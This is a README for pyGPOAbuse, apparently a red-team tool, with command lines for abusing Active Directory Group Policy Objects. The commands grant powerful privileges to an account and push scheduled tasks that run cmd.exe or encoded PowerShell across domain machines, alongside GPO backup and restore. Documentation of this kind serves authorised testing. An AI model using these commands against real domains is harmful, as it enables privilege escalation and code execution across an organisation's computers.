# pyGPOAbuse

A Python implementation of GPO Abuse techniques, inspired by [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse).

## Overview

This tool allows you to abuse Group Policy Objects (GPOs) in Active Directory environments. It provides the following capabilities:

1. Add user rights to an account in a GPO
2. Add scheduled tasks to a GPO 
3. Backup a GPO before modification
4. Restore a GPO after modification

## Features

- **Add user rights**: Assign specific rights to a user account through GPO
- **Add scheduled tasks**: Create tasks in GPOs that will be executed on targeted computers/users
- **Backup/Restore GPOs**: Safely backup a GPO's state before modification and restore it later

## Usage

### General Syntax

```
python pygpoabuse.py <domain>/<username>[:<password>] [options]
```

### Authentication Options

```
-hashes LMHASH:NTHASH   Use NTLM hashes for authentication
-k                      Use Kerberos authentication
-dc-ip IP               Domain controller IP or hostname
-ldaps                  Use LDAPS instead of LDAP
-ccache FILE            ccache file for Kerberos authentication
```

### Adding User Rights

```
python pygpoabuse.py domain/username:password --add-rights -gpo-id "{GUID}" -rights "SeTcbPrivilege,SeBackupPrivilege" -user-account "targetuser"
```

### Adding Scheduled Tasks

```
python pygpoabuse.py domain/username:password --add-task -gpo-id "{GUID}" -taskname "Maintenance" -command "cmd.exe" -user
```

Use `-user` to create a user GPO task, otherwise it will create a computer GPO task.

### Backing Up a GPO

Before making changes to a GPO, you can create a backup:

```
python pygpoabuse.py domain/username:password --backup-gpo -gpo-id "{GUID}" [-backup-dir "/path/to/backups"]
```

This will create a backup of the GPO and return a backup ID (also printed to the console). You can optionally specify a directory to store the backup with `-backup-dir`.

### Restoring a GPO

After you're done with your operations, you can restore the GPO to its original state:

```
python pygpoabuse.py domain/username:password --restore-gpo -backup-id "gpo_backup_{GUID}_{TIMESTAMP}"
```

Alternatively, you can specify the backup directory directly:

```
python pygpoabuse.py domain/username:password --restore-gpo -backup-dir "/path/to/backup_folder"
```

## Example Workflow

This example demonstrates a complete workflow for safely abusing a GPO:

1. First, backup the GPO:
```
python pygpoabuse.py domain/admin:password --backup-gpo -gpo-id "{GUID}"
```

2. Add a scheduled task to the GPO:
```
python pygpoabuse.py domain/admin:password --add-task -gpo-id "{GUID}" -taskname "Update" -command "powershell.exe -encodedcommand {BASE64}" -powershell
```

3. After completing your operations, restore the GPO:
```
python pygpoabuse.py domain/admin:password --restore-gpo -backup-id "gpo_backup_{GUID}_{TIMESTAMP}"
```

## Credits

- This tool is a Python implementation of [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) by @pkb1s
- Thanks to @airman604 for [schtask_now.py](https://github.com/airman604/schtask_now) that was used and modified in this project

